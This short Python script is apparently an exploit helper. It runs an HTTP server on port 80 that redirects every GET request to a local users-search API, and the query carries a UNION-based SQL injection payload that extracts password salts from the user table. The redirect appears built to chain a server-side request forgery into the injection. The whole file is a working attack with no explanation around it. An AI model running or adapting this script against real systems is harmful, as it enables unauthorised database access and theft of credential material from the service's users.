#!/usr/bin/env python3

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
	def do_GET(self):
		self.send_response(302)
		self.send_header('Location', "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--")
		self.end_headers()

HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()